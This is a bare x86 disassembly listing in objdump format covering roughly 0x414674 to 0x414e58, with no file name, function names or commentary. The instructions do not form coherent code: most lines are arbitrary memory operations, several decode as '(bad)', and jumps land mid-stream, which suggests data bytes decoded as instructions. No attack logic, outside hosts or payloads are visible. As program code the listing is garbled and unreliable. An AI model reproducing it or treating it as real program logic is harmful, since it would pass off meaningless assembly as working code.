  414674:	or     al,0x40
  414676:	dec    ecx
  414677:	add    dl,BYTE PTR [ecx]
  414679:	and    eax,eax
  41467b:	es push cs
  41467d:	add    BYTE PTR [eax],cl
  41467f:	sub    al,0x82
  414681:	jo     0x414683
  414683:	cmp    BYTE PTR [eax+0x440c0000],al
  414689:	popa   
  41468a:	and    BYTE PTR [edx+0x48],dl
  41468d:	add    DWORD PTR [eax+0x28082772],esi
  414693:	and    eax,0x28016060
  414698:	or     BYTE PTR [ecx],bh
  41469a:	and    ah,BYTE PTR [eax+0x1d]
  41469d:	mov    BYTE PTR [ebp+0x10],dh
  4146a0:	inc    eax
  4146a1:	pusha  
  4146a2:	test   DWORD PTR [eax+eiz*8+0x45150e1],eax
  4146a9:	inc    eax
  4146aa:	mov    DWORD PTR [eax],eax
  4146ac:	inc    eax
  4146ad:	mov    dl,0x31
  4146af:	mov    eax,ds:0x1005089
  4146b4:	sbb    DWORD PTR es:[ebp+0x4ca24e8c],eax
  4146bb:	or     BYTE PTR [eax+0x3844201],al
  4146c1:	and    BYTE PTR [ecx-0x7fc2cfbd],al
  4146c7:	add    BYTE PTR [eax-0x7bbb5f80],cl
  4146cd:	push   edx
  4146ce:	and    BYTE PTR [edx+0x8],al
  4146d1:	inc    eax
  4146d2:	add    DWORD PTR [esi-0x6c8bea01],eax
  4146d8:	inc    edx
  4146d9:	add    BYTE PTR [eax+0x2c],dl
  4146dc:	add    al,0x1
  4146df:	add    BYTE PTR [eax],al
  4146e1:	add    BYTE PTR [edi+0x3307400a],0x73
  4146e8:	inc    eax
  4146e9:	adc    BYTE PTR [eax*2+0x1d41a2a8],dl
  4146f0:	and    DWORD PTR [edx],esp
  4146f2:	push   eax
  4146f3:	bound  edx,QWORD PTR [esp+eax*2+0x8]
  4146f7:	and    BYTE PTR [edx],dl
  4146f9:	shl    DWORD PTR [edx],1
  4146fb:	or     eax,0x20c111a0
  414700:	and    eax,eax
  414702:	mov    ecx,0xa80500
  414707:	and    al,0x48
  414709:	adc    BYTE PTR [eax],cl
  41470b:	adc    BYTE PTR [edx+ecx*4+0x40],al
  41470f:	add    eax,DWORD PTR [ecx+0x2224b00a]
  414715:	test   al,0x3
  414717:	inc    edx
  414718:	add    DWORD PTR [eax],ecx
  41471a:	inc    eax
  41471b:	add    BYTE PTR [eax+0x50118017],ch
  414721:	and    BYTE PTR [eax],al
  414723:	add    BYTE PTR [eax],0x98
  414726:	dec    esp
  414727:	pop    ecx
  414728:	xor    BYTE PTR [eax],dl
  41472a:	leave  
  41472b:	sbb    DWORD PTR [eax],edx
  41472d:	add    BYTE PTR [edx],al
  41472f:	and    eax,0x708a8010
  414734:	add    BYTE PTR [esi],bh
  414736:	pusha  
  414737:	add    BYTE PTR [eax],dl
  414739:	xor    eax,0xe8202618
  41473e:	add    eax,0x96021c02
  414743:	or     BYTE PTR [eax],al
  414745:	dec    esp
  414746:	xor    BYTE PTR [esi],al
  414748:	add    BYTE PTR [esp+ecx*1],cl
  41474b:	mov    BYTE PTR [esi],dl
  41474d:	adc    BYTE PTR [eax],ah
  41474f:	add    BYTE PTR [edx+0x48000c28],al
  414755:	adc    BYTE PTR [eax+eax*1],al
  414758:	and    BYTE PTR [eax+0x41811340],al
  41475e:	or     BYTE PTR [ecx-0x5bfb59e8],bl
  414764:	add    BYTE PTR [esi],al
  414766:	and    BYTE PTR [eax],al
  414768:	add    BYTE PTR [eax],0x51
  41476b:	add    al,0x94
  41476d:	or     dl,BYTE PTR [eax]
  41476f:	(bad)  
  414771:	add    BYTE PTR [eax+0x31828a89],al
  414777:	pop    eax
  414778:	inc    esp
  414779:	pusha  
  41477a:	add    BYTE PTR [edx],ah
  41477c:	pop    ecx
  41477d:	inc    eax
  41477e:	mov    BYTE PTR [eax+0xa0210e0],bl
  414784:	pop    esp
  414785:	or     al,BYTE PTR [eax-0x4ffac800]
  41478b:	mov    al,ds:0x18622930
  414790:	and    BYTE PTR [eax],0x5
  414793:	or     BYTE PTR [eax],dl
  414795:	push   eax
  414796:	adc    al,BYTE PTR [eax]
  414798:	and    BYTE PTR [esp+edx*1],cl
  41479b:	pusha  
  41479c:	les    esi,FWORD PTR [ecx]
  41479e:	sub    DWORD PTR [edx],eax
  4147a0:	jge    0x4147a6
  4147a2:	or     BYTE PTR [edx-0x5ffa7f2f],bh
  4147a8:	add    dh,BYTE PTR [eax+0x18]
  4147ab:	nop
  4147ac:	and    BYTE PTR ds:0x82000000,dl
  4147b2:	or     BYTE PTR [edx],dl
  4147b4:	test   BYTE PTR ds:0x8100002,cl
  4147ba:	dec    ecx
  4147bb:	or     al,BYTE PTR [ecx+0x61014601]
  4147c1:	add    BYTE PTR [eax-0x1ddfdf7c],0xa
  4147c8:	or     DWORD PTR [eax+ebx*2],0x1ea88681
  4147cf:	and    BYTE PTR [eax+0x28],al
  4147d2:	add    BYTE PTR [edx+eax*4],ch
  4147d5:	add    BYTE PTR [ecx+0x6b500100],0x40
  4147dc:	cmp    eax,0xe4808401
  4147e1:	add    BYTE PTR [eax-0x60],al
  4147e4:	sub    eax,0x2d014896
  4147e9:	add    BYTE PTR [eax],0x1
  4147ec:	add    bl,0x6b
  4147ef:	adc    BYTE PTR [eax+ecx*4],ah
  4147f2:	xor    BYTE PTR [ebx+0x2a080128],al
  4147f8:	loopne 0x41484c
  4147fa:	adc    BYTE PTR [eax+eiz*2],dl
  4147fd:	xchg   ebx,eax
  4147fe:	test   BYTE PTR [eax],dl
  414800:	push   edx
  414801:	or     BYTE PTR [edx],al
  414803:	test   BYTE PTR [ebx+edx*2],al
  414806:	sub    al,0xa
  414808:	mov    ds:0x903ca004,al
  41480d:	(bad)  
  41480e:	rcl    BYTE PTR [eax+esi*1+0x44],1
  414812:	ret    0x302
  414815:	mov    BYTE PTR [eax+0x9218006],al
  41481b:	mov    dh,0x0
  41481d:	adc    BYTE PTR [esp+eax*1],al
  414820:	adc    BYTE PTR [eax],ah
  414822:	add    al,0x68
  414824:	add    BYTE PTR [edx+0x18],ah
  414827:	mov    al,ds:0x14501050
  41482c:	adc    ebp,DWORD PTR [ebx]
  41482e:	add    BYTE PTR [eax],cl
  414830:	pop    ebx
  414831:	or     al,BYTE PTR [ecx-0x65cf7fff]
  414837:	or     cl,al
  414839:	add    BYTE PTR [eax],al
  41483b:	or     al,BYTE PTR [ecx+0x818201d]
  414841:	mov    eax,ds:0x20000f
  414846:	or     BYTE PTR [eax],al
  414848:	inc    esp
  414849:	add    BYTE PTR [eax],al
  41484b:	mov    esi,0x1400
  414850:	add    BYTE PTR [ecx+0x18],0x20
  414854:	or     DWORD PTR [eax],edx
  414856:	add    al,al
  414858:	sub    BYTE PTR [edx],al
  41485a:	xor    al,0x2c
  41485c:	add    ch,al
  41485e:	pusha  
  41485f:	and    al,0x84
  414861:	sub    al,BYTE PTR [ebx+esi*4]
  414864:	and    al,0x11
  414866:	and    BYTE PTR [ecx-0x38],al
  414869:	adc    eax,ecx
  41486b:	inc    edx
  41486c:	sub    al,0x49
  41486e:	and    al,0x4
  414871:	and    BYTE PTR [ecx],cl
  414873:	add    al,ah
  414875:	adc    al,0x0
  414877:	xchg   BYTE PTR [eax+0x423200a2],al
  41487d:	add    al,0x4
  41487f:	or     eax,0x10a05400
  414884:	adc    ch,BYTE PTR [eax]
  414886:	add    DWORD PTR [ecx],0x940208c4
  41488c:	sub    eax,0x280910c1
  414891:	or     dl,BYTE PTR [eax+0x1]
  414894:	add    BYTE PTR [edi],0x90
  414897:	adc    edx,ecx
  414899:	add    BYTE PTR [eax+0x6698c94],bh
  41489f:	xor    DWORD PTR [eax+ecx*4-0x60],0xffffff94
  4148a4:	and    DWORD PTR [eax],ecx
  4148a6:	add    BYTE PTR [ecx],dl
  4148a8:	add    BYTE PTR ds:0x10060920,al
  4148ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148af:	inc    eax
  4148b0:	sub    BYTE PTR [ebx],0xb
  4148b3:	adc    BYTE PTR [edx],bl
  4148b5:	add    BYTE PTR [eax+edi*1-0x5ef973e8],bl
  4148bc:	add    BYTE PTR [eax+0xb814410],dl
  4148c2:	add    BYTE PTR [eax],al
  4148c4:	outs   dx,BYTE PTR ds:[esi]
  4148c5:	xor    al,0x8
  4148c7:	bound  esp,QWORD PTR [esp+edx*1]
  4148ca:	adc    BYTE PTR [eax+0x2],al
  4148cd:	dec    eax
  4148ce:	adc    BYTE PTR [ebx],ch
  4148d0:	add    BYTE PTR [eax],0x40
  4148d3:	sbb    BYTE PTR [eax+0xc],al
  4148d6:	and    BYTE PTR [ebx-0x80],ah
  4148d9:	cs inc eax
  4148db:	push   ss
  4148dc:	sbb    edx,DWORD PTR [ecx]
  4148de:	pop    es
  4148df:	mov    al,ds:0x2001842c
  4148e4:	and    BYTE PTR [edx],al
  4148e6:	xor    BYTE PTR [eax+0x40],cl
  4148e9:	push   ecx
  4148ea:	xor    BYTE PTR [eax],dh
  4148ec:	inc    edx
  4148ed:	inc    eax
  4148ee:	adc    eax,DWORD PTR [eax+0x30]
  4148f1:	inc    esp
  4148f2:	rol    BYTE PTR [eax],cl
  4148f4:	adc    al,0xc0
  4148f6:	push   ecx
  4148f7:	add    al,0x10
  4148f9:	or     BYTE PTR [edi],al
  4148fb:	xchg   DWORD PTR [eax-0x16dd1d80],eax
  414901:	add    BYTE PTR [edx+0x30103480],al
  414907:	add    BYTE PTR [ecx+eax*1+0x8a465],al
  41490e:	add    DWORD PTR [eax+0x8],eax
  414911:	and    BYTE PTR [edi],dl
  414913:	sub    BYTE PTR [edi+0x8201004],0x8
  41491a:	mov    BYTE PTR [ebx],dl
  41491c:	or     BYTE PTR [eax],dl
  41491e:	sub    BYTE PTR [esp+ecx*8],al
  414921:	add    BYTE PTR [eax+0x1090011b],dl
  414927:	add    al,0x1c
  414929:	and    cl,BYTE PTR [eax]
  41492b:	add    BYTE PTR [eax+0x208134],ah
  414931:	adc    BYTE PTR [ecx],0x0
  414934:	adc    dl,BYTE PTR [esi+ecx*4]
  414937:	add    BYTE PTR [eax],dh
  414939:	adc    BYTE PTR [ebx],cl
  41493b:	sub    al,0x3
  41493d:	sub    al,0x83
  41493f:	adc    al,BYTE PTR [edx]
  414941:	and    al,0x81
  414943:	sub    al,0x0
  414945:	dec    eax
  414946:	shl    BYTE PTR [eax],0x40
  414949:	loopne 0x4148d5
  41494b:	test   BYTE PTR [eax+0x0],al
  41494e:	dec    ecx
  41494f:	and    al,0x14
  414951:	cmp    al,0x0
  414953:	or     DWORD PTR [ecx+0x8420b00],eax
  414959:	and    BYTE PTR [eax+0x41],dl
  41495c:	mov    DWORD PTR [ecx],ecx
  41495e:	push   ecx
  41495f:	and    al,0x0
  414961:	add    BYTE PTR [eax],bl
  414963:	adc    al,BYTE PTR [eax+0x2c280090]
  414969:	xchg   esp,eax
  41496a:	add    BYTE PTR [edx],ah
  41496c:	inc    ebp
  41496d:	fcom   DWORD PTR [eax+0x8]
  414970:	lods   eax,DWORD PTR ds:[esi]
  414971:	add    al,0x0
  414973:	inc    eax
  414974:	and    al,al
  414976:	test   BYTE PTR [eax+0x1850460],al
  41497c:	mov    ds:0x20140481,al
  414981:	add    al,BYTE PTR [eax]
  414983:	adc    BYTE PTR [eax+0x4],0x40
  414987:	inc    ebx
  414988:	adc    al,BYTE PTR [eax+eax*1]
  41498b:	pop    ss
  41498c:	popa   
  41498d:	mov    es,WORD PTR [edx]
  41498f:	add    al,al
  414991:	add    al,0x1
  414993:	and    BYTE PTR [eax],bh
  414995:	add    dl,BYTE PTR [edx]
  414997:	mov    al,ds:0x9080160f
  41499c:	add    al,0x20
  41499e:	or     BYTE PTR [ecx+ecx*1+0x30a2416],ah
  4149a5:	inc    eax
  4149a6:	push   es
  4149a7:	inc    eax
  4149a8:	dec    eax
  4149a9:	lock or al,BYTE PTR [edx]
  4149ac:	add    al,0x30
  4149ae:	dec    eax
  4149af:	add    BYTE PTR [ecx],al
  4149b1:	push   ebp
  4149b2:	stos   BYTE PTR es:[edi],al
  4149b3:	inc    eax
  4149b4:	add    al,0x0
  4149b6:	jb     0x4149c2
  4149b8:	push   ebx
  4149b9:	lea    edx,[ecx+ebx*1]
  4149bc:	cmp    al,0xb
  4149be:	or     DWORD PTR [eax-0x5e7f5680],esp
  4149c4:	inc    eax
  4149c5:	mov    al,0x40
  4149c7:	add    ecx,DWORD PTR [eax+edx*1]
  4149ca:	sub    BYTE PTR [eax],cl
  4149cc:	sbb    BYTE PTR [eax],al
  4149ce:	and    DWORD PTR [edx],ebx
  4149d0:	add    al,al
  4149d2:	or     BYTE PTR [eax],ah
  4149d4:	mov    es,WORD PTR [eax-0x80]
  4149d7:	and    al,0x30
  4149d9:	sub    al,BYTE PTR ds:0x10a8004
  4149df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e0:	inc    esp
  4149e1:	adc    BYTE PTR [ecx],ah
  4149e3:	adc    ch,BYTE PTR ds:0xa04872a1
  4149e9:	xchg   edx,eax
  4149ea:	mov    WORD PTR [ecx],ss
  4149ec:	and    BYTE PTR [eax],al
  4149ee:	sub    al,BYTE PTR [eax+0x8152140]
  4149f4:	dec    ecx
  4149f5:	shl    BYTE PTR [eax+eax*1+0x44],0xa7
  4149fa:	add    BYTE PTR [edx],al
  4149fc:	sbb    BYTE PTR [eax-0x80],al
  4149ff:	adc    al,0x20
  414a01:	data16 add BYTE PTR [eax+0x8],cl
  414a05:	add    BYTE PTR [eax],0x80
  414a08:	adc    al,0x39
  414a0a:	and    dh,BYTE PTR [ecx]
  414a0c:	add    BYTE PTR [eax],bl
  414a0e:	rol    BYTE PTR [eax+0x34],0x98
  414a12:	add    DWORD PTR [eax+0x2],esi
  414a15:	or     BYTE PTR [ecx+ecx*4],al
  414a18:	push   eax
  414a19:	ret    0x85
  414a1c:	dec    ebx
  414a1d:	sub    eax,0x53a2a3a0
  414a22:	and    eax,0x16505a00
  414a27:	and    al,0x1
  414a29:	adc    al,0x2
  414a2b:	test   BYTE PTR [eax],dl
  414a2d:	sub    al,0xea
  414a2f:	and    BYTE PTR [eax],0xa8
  414a32:	dec    eax
  414a33:	inc    eax
  414a34:	popa   
  414a35:	or     BYTE PTR [ecx+edx*4+0xd100838],0x38
  414a3d:	add    BYTE PTR [eax],cl
  414a3f:	add    DWORD PTR [ecx+0x64],0xffffff8c
  414a43:	bound  eax,QWORD PTR [eax]
  414a45:	or     DWORD PTR [eax],ebp
  414a47:	mov    al,ds:0x24082226
  414a4c:	add    BYTE PTR [eax+0x4c423180],0x0
  414a53:	shl    BYTE PTR [edx],0x88
  414a56:	push   es
  414a57:	sub    ecx,DWORD PTR [eax+0x427931cd]
  414a5d:	and    BYTE PTR [eax+eax*1],al
  414a60:	adc    BYTE PTR [edi+edx*2],dh
  414a63:	adc    eax,DWORD PTR ds:0xc8509891
  414a69:	add    al,0x2
  414a6b:	add    ch,BYTE PTR [eax-0x37fdfe5c]
  414a71:	aam    0x5
  414a73:	add    BYTE PTR [eax+0x1a43339],0x3a
  414a7a:	mov    al,ds:0x2906c020
  414a7f:	add    DWORD PTR [ecx+0x4220090],ecx
  414a85:	jmp    0x414a89
  414a87:	add    BYTE PTR [esi],cl
  414a89:	sub    DWORD PTR [eax+eax*2+0x39],eax
  414a8d:	or     DWORD PTR [eax+eax*4+0x804a00],0x20c049
  414a98:	rol    BYTE PTR [eax+0x18],0x2
  414a9c:	jmp    0x414a9e
  414a9e:	mov    eax,ds:0x89ac6400
  414aa3:	xchg   ecx,eax
  414aa4:	stos   BYTE PTR es:[edi],al
  414aa5:	add    DWORD PTR [edx-0x7f96f1ec],eax
  414aab:	inc    eax
  414aac:	xchg   edx,eax
  414aad:	mov    ds:0x1300011,al
  414ab2:	and    eax,DWORD PTR [ebp+0x86474c]
  414ab8:	xchg   edx,eax
  414ab9:	test   BYTE PTR [ecx],ah
  414abb:	add    BYTE PTR [ecx],al
  414abd:	sub    esp,DWORD PTR [eax+0x21]
  414ac0:	add    dl,BYTE PTR [edx+0x20]
  414ac3:	mov    cl,0x2
  414ac5:	arpl   WORD PTR [eax],ax
  414ac7:	inc    eax
  414ac8:	adc    al,ah
  414aca:	add    BYTE PTR [eax+0x54],ah
  414acd:	or     BYTE PTR [edx+0x682407c1],al
  414ad3:	push   es
  414ad4:	inc    ecx
  414ad5:	add    BYTE PTR [edx],al
  414ad7:	popa   
  414ad8:	clc    
  414ad9:	nop
  414ada:	add    BYTE PTR [edx],al
  414adc:	add    BYTE PTR [ecx-0x70],dl
  414adf:	retf   
  414ae0:	sub    al,0x22
  414ae2:	test   al,0x1c
  414ae4:	push   es
  414ae5:	add    al,0x51
  414ae8:	add    al,0x8
  414aea:	adc    al,BYTE PTR [edx+0x50]
  414aed:	mov    WORD PTR [ebx],es
  414aef:	pusha  
  414af0:	mov    eax,ds:0x20040928
  414af5:	or     eax,DWORD PTR [eax+eax*1]
  414af8:	inc    ecx
  414af9:	add    eax,0x2946450
  414afe:	add    DWORD PTR [edx],eax
  414b00:	inc    esp
  414b01:	test   al,0xd2
  414b03:	or     DWORD PTR [esi+0x62009011],edx
  414b09:	add    BYTE PTR [eax],ah
  414b0b:	sub    BYTE PTR [eax],al
  414b0d:	mov    al,ds:0x1084000
  414b12:	mov    esp,DWORD PTR [esp+edx*8]
  414b15:	sub    dl,BYTE PTR [ecx]
  414b17:	add    BYTE PTR [eax],ch
  414b19:	inc    edi
  414b1a:	inc    eax
  414b1b:	adc    BYTE PTR [edx],dh
  414b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b1e:	popf   
  414b1f:	sbb    BYTE PTR [eax],ch
  414b21:	jo     0x414b93
  414b23:	rcl    DWORD PTR [esi],0x40
  414b26:	add    BYTE PTR [esp+ecx*4],al
  414b29:	adc    BYTE PTR [eax],ah
  414b2b:	add    BYTE PTR [ecx],ah
  414b2d:	or     eax,0xc1000691
  414b32:	add    BYTE PTR [eax],al
  414b34:	mov    BYTE PTR [edx],ah
  414b36:	jo     0x414ab9
  414b38:	and    DWORD PTR [ecx+0x4002b138],0x1b4630
  414b42:	and    BYTE PTR [eax],ah
  414b44:	add    DWORD PTR [eax+0x4d3aa0],ecx
  414b4a:	dec    eax
  414b4b:	fist   DWORD PTR [edx+0x500000c0]
  414b51:	add    BYTE PTR [edx],al
  414b53:	data16 and al,dh
  414b56:	adc    al,al
  414b58:	add    cl,BYTE PTR [ecx+0x0]
  414b5b:	mov    ah,0x4
  414b5d:	add    dh,BYTE PTR [eax]
  414b5f:	add    BYTE PTR [eax+0x9],al
  414b62:	mov    ecx,0x4040e006
  414b67:	add    BYTE PTR [eax],dl
  414b69:	and    cl,bl
  414b6b:	and    DWORD PTR [eax],eax
  414b6d:	or     al,BYTE PTR [eax+0x40]
  414b70:	mov    al,0xa
  414b72:	add    BYTE PTR [eax],ch
  414b74:	add    BYTE PTR [ecx+ebp*2+0x2030ae80],cl
  414b7b:	push   cs
  414b7c:	or     dl,BYTE PTR [ebx]
  414b7e:	jo     0x414b8b
  414b80:	and    BYTE PTR [eax],bl
  414b82:	test   al,0x4
  414b84:	add    BYTE PTR [esi],0x0
  414b87:	inc    eax
  414b88:	add    BYTE PTR [edx+eax*1-0x369f4000],bl
  414b8f:	adc    BYTE PTR [eax+0x2900208],dl
  414b95:	and    BYTE PTR [eax],al
  414b97:	and    al,0x14
  414b99:	and    cl,al
  414b9b:	push   eax
  414b9c:	push   ss
  414b9d:	or     cl,BYTE PTR [edx]
  414b9f:	and    BYTE PTR [ebx+0x12],al
  414ba2:	dec    edx
  414ba3:	add    DWORD PTR [ecx],eax
  414ba5:	and    al,ah
  414ba7:	add    BYTE PTR [edx],al
  414ba9:	add    DWORD PTR [esp+eax*4+0x7846aa8],ebp
  414bb0:	add    BYTE PTR [eax+0x21],cl
  414bb3:	add    eax,0x4850b13
  414bb8:	or     BYTE PTR [ebx],al
  414bba:	add    BYTE PTR [eax],al
  414bbc:	cwde   
  414bbd:	add    BYTE PTR [eax],ah
  414bbf:	add    BYTE PTR [eax],al
  414bc1:	xlat   BYTE PTR ds:[ebx]
  414bc2:	popa   
  414bc3:	add    DWORD PTR [esi-0x6b],eax
  414bc6:	add    al,0x0
  414bc8:	add    dl,al
  414bca:	mov    al,ds:0x8c00110a
  414bcf:	pop    eax
  414bd0:	or     ah,BYTE PTR [ecx-0x1f]
  414bd3:	and    BYTE PTR [eax+ecx*8],ah
  414bd6:	xor    al,0x8b
  414bd8:	cmp    al,0x11
  414bda:	add    DWORD PTR [edx+0x27],edx
  414bdd:	adc    BYTE PTR [eax+eax*1+0x40],cl
  414be1:	mov    esp,DWORD PTR fs:[ecx+eax*2]
  414be5:	and    al,0x85
  414be7:	push   cs
  414be8:	and    BYTE PTR [eax],0x0
  414beb:	sub    DWORD PTR [ebx],esi
  414bed:	mov    al,ds:0xd0540588
  414bf2:	daa    
  414bf3:	outs   dx,BYTE PTR ds:[esi]
  414bf4:	add    BYTE PTR [eax],dh
  414bf6:	and    eax,DWORD PTR [ebx]
  414bf8:	loopne 0x414c3e
  414bfa:	rol    BYTE PTR [eax-0x3ccfd740],0x8a
  414c01:	add    BYTE PTR [edx-0x6f],0x31
  414c05:	inc    eax
  414c06:	add    BYTE PTR [ecx+0x4a],cl
  414c09:	add    BYTE PTR [eax],al
  414c0b:	sub    BYTE PTR [eax],dh
  414c0d:	add    BYTE PTR [eax+0x60],0x10
  414c11:	or     BYTE PTR [eax+0x386],0xa0
  414c18:	add    BYTE PTR [esi+0x26000200],dh
  414c1e:	pushf  
  414c1f:	adc    BYTE PTR [eax],al
  414c21:	and    al,0x40
  414c23:	add    al,0x40
  414c25:	and    al,al
  414c27:	dec    eax
  414c28:	add    al,0x6
  414c2a:	inc    eax
  414c2b:	adc    al,0x2
  414c2d:	loope  0x414c93
  414c2f:	adc    al,0x1
  414c31:	adc    DWORD PTR [edx+0x4],0xa1271108
  414c38:	push   edx
  414c39:	add    BYTE PTR [ecx],ah
  414c3b:	add    al,0x40
  414c3d:	sbb    al,BYTE PTR [ebp+eax*2+0x14380001]
  414c44:	and    cl,cl
  414c46:	test   BYTE PTR [eax],al
  414c48:	or     BYTE PTR [eax+0x22],0xe
  414c4c:	rol    BYTE PTR [eax],1
  414c4e:	adc    eax,0x1c
  414c51:	mov    eax,ds:0x64000049
  414c56:	rcr    BYTE PTR [edx-0x7f],1
  414c59:	and    al,BYTE PTR ds:0x672c4444
  414c5f:	add    DWORD PTR ds:0x9000e0a0,esp
  414c65:	adc    al,BYTE PTR [ecx+0x4]
  414c68:	and    ebp,DWORD PTR [eax-0x7520ebd7]
  414c6e:	cmp    al,0x29
  414c70:	add    esp,DWORD PTR [eax-0x77fbbdfc]
  414c76:	and    al,0x62
  414c78:	adc    BYTE PTR [ecx+0x489e606d],al
  414c7e:	add    BYTE PTR [esi+ecx*8],ah
  414c81:	dec    eax
  414c82:	mov    eax,DWORD PTR [edi+eiz*1]
  414c85:	and    eax,DWORD PTR [eax+0x0]
  414c88:	add    BYTE PTR es:[edi+edx*1+0x610c9208],ah
  414c90:	nop
  414c91:	push   0xb4180261
  414c96:	push   esp
  414c97:	adc    eax,0x34008262
  414c9c:	mov    eax,ds:0x9ef00180
  414ca1:	add    BYTE PTR ds:0x28000,al
  414ca7:	and    dl,BYTE PTR [edx+0x1448a422]
  414cad:	add    al,0xc1
  414caf:	add    al,0x4c
  414cb1:	adc    al,0x10
  414cb3:	and    DWORD PTR [ecx+0x1e2c5048],eax
  414cb9:	add    BYTE PTR ss:[eax],bl
  414cbc:	add    cl,BYTE PTR [edx]
  414cbe:	push   0x8400ce48
  414cc3:	loopne 0x414cd7
  414cc5:	adc    BYTE PTR [ecx-0x5f],cl
  414cc8:	lock sub al,0x82
  414ccb:	and    DWORD PTR [eax+ebx*1+0x41],eax
  414ccf:	rol    DWORD PTR [eax+eax*4],1
  414cd2:	sub    BYTE PTR [ebx+0x4002650],0x89
  414cd9:	or     BYTE PTR [edx+0x61],0xaa
  414cdd:	add    al,0x26
  414cdf:	and    BYTE PTR [ebx],dh
  414ce1:	add    al,0x8
  414ce3:	inc    esp
  414ce4:	add    BYTE PTR [edx+0x29040c1],cl
  414cea:	add    dl,BYTE PTR [eax+0x19202040]
  414cf0:	push   ebp
  414cf1:	xor    BYTE PTR [edx],0x6
  414cf4:	mov    ch,0x40
  414cf6:	or     BYTE PTR [esp+ecx*1],al
  414cf9:	add    cl,BYTE PTR [ecx]
  414cfb:	inc    edx
  414cfc:	and    BYTE PTR [edx+0x11774079],0xd2
  414d03:	adc    BYTE PTR [ecx],dh
  414d05:	mov    BYTE PTR [eax],0x11
  414d08:	or     al,0x8
  414d0a:	add    eax,DWORD PTR [eax]
  414d0c:	add    DWORD PTR [edi+ecx*1+0x55810064],edx
  414d13:	add    BYTE PTR [eax+0x40],ah
  414d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d17:	add    BYTE PTR [eax],dh
  414d19:	dec    eax
  414d1a:	cwde   
  414d1b:	xchg   esp,eax
  414d1c:	or     BYTE PTR [ecx],bl
  414d1e:	lea    eax,[ecx-0x50]
  414d21:	sub    al,al
  414d23:	add    al,0x8
  414d25:	js     0x414d2b
  414d27:	rol    BYTE PTR [eax-0x7d],0xd0
  414d2b:	daa    
  414d2c:	cmp    al,0xb4
  414d2e:	mov    al,ds:0x49b8008
  414d33:	xor    DWORD PTR [eax],eax
  414d35:	push   edx
  414d36:	and    BYTE PTR [eax+0x80c08b4],al
  414d3c:	mov    WORD PTR [eax],es
  414d3e:	and    al,BYTE PTR [eax]
  414d40:	add    BYTE PTR [esp+ecx*1+0x2a],cl
  414d44:	xchg   edx,eax
  414d45:	push   eax
  414d46:	pop    edx
  414d47:	sub    eax,0xa880000
  414d4c:	jno    0x414d56
  414d4e:	dec    eax
  414d4f:	or     al,0xb0
  414d51:	add    DWORD PTR [eax],eax
  414d53:	xor    dl,ah
  414d55:	adc    DWORD PTR [eax*4+0x812a240],esp
  414d5c:	push   es
  414d5d:	clc    
  414d5e:	mov    ds:0x81900000,al
  414d63:	mov    eax,ds:0x2a400c88
  414d68:	push   edx
  414d69:	pop    ss
  414d6a:	add    BYTE PTR [esi-0x26f9ddfa],ch
  414d70:	xchg   si,ax
  414d72:	add    eax,DWORD PTR [eax]
  414d74:	add    DWORD PTR [ebx],eax
  414d76:	xchg   ebp,eax
  414d77:	xor    BYTE PTR [eax+0x41],dl
  414d7a:	test   BYTE PTR [eax],ah
  414d7c:	adc    DWORD PTR [edx],0x9020090
  414d82:	add    BYTE PTR [ecx+0x60042144],al
  414d88:	add    al,0xc
  414d8a:	add    DWORD PTR [edx+0x41],esp
  414d8d:	and    BYTE PTR [eax*1-0x3fd75f7c],ah
  414d94:	adc    BYTE PTR [edx-0x7e],ah
  414d97:	adc    DWORD PTR [edx+ebp*1],0x801210b0
  414d9e:	add    BYTE PTR [ebx],al
  414da0:	add    BYTE PTR [eax],0x2
  414da3:	inc    edx
  414da4:	add    al,BYTE PTR [eax]
  414da6:	and    al,BYTE PTR [edi+0xc08dacc]
  414dac:	xor    dl,BYTE PTR [eax]
  414dae:	or     BYTE PTR [eax],0x0
  414db1:	adc    DWORD PTR [esi],edx
  414db3:	push   es
  414db4:	xchg   edx,eax
  414db5:	adc    BYTE PTR [eax+0xa],ch
  414db8:	add    dh,BYTE PTR [ecx]
  414dba:	aam    0x2
  414dbc:	jb     0x414e1e
  414dbe:	mov    al,ds:0x80c0c50a
  414dc3:	mov    al,ds:0x1006140f
  414dc8:	test   al,0xe4
  414dca:	push   ebx
  414dcb:	add    BYTE PTR [esi+0x4000c680],0x24
  414dd2:	rcr    al,0x3
  414dd5:	popa   
  414dd6:	add    DWORD PTR [edx+0x4818201],ecx
  414ddc:	inc    eax
  414ddd:	xor    BYTE PTR [eax],0x24
  414de0:	lods   al,BYTE PTR ds:[esi]
  414de1:	pusha  
  414de2:	enter  0x1400,0x27
  414de6:	sbb    DWORD PTR [ebx+ecx*4],0xe2801966
  414ded:	lea    eax,[ecx]
  414def:	or     BYTE PTR [eax+0x1d020402],al
  414df5:	and    dh,BYTE PTR [eax+0x4c]
  414df8:	add    BYTE PTR [ecx-0x70],al
  414dfb:	push   es
  414dfc:	popa   
  414dfd:	(bad)  
  414dfe:	sub    BYTE PTR [ecx],bh
  414e00:	add    al,0x82
  414e02:	and    BYTE PTR [eax+eax*1],ah
  414e05:	adc    al,0x84
  414e07:	inc    esp
  414e08:	adc    DWORD PTR [ecx],ecx
  414e0a:	dec    eax
  414e0b:	add    BYTE PTR ds:0x8080010,al
  414e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e12:	mov    eax,0x10c11285
  414e17:	add    al,0xa2
  414e19:	add    BYTE PTR [ecx+0x16],cl
  414e1c:	and    BYTE PTR [eax],ah
  414e1e:	mov    dh,0x74
  414e20:	sbb    BYTE PTR [eax+0x10710006],dh
  414e26:	sbb    BYTE PTR [eax],dl
  414e28:	and    BYTE PTR [eax],ah
  414e2a:	rol    BYTE PTR fs:[edi-0x3efebabc],0x30
  414e32:	jle    0x414e4c
  414e34:	xor    BYTE PTR [ecx+0x480010],dl
  414e3a:	les    edx,FWORD PTR [eax]
  414e3c:	shl    DWORD PTR [eax-0x7f],1
  414e3f:	or     BYTE PTR [eax],al
  414e41:	shl    bh,0x74
  414e44:	sbb    al,0x40
  414e46:	add    DWORD PTR [edx+0x2],ecx
  414e49:	cwde   
  414e4a:	int    0x61
  414e4c:	test   BYTE PTR [eax],al
  414e4e:	sbb    BYTE PTR [eax],dl
  414e50:	add    dl,BYTE PTR [eax]
  414e52:	and    BYTE PTR [ecx+0x8142648],al
  414e58:	inc    esp
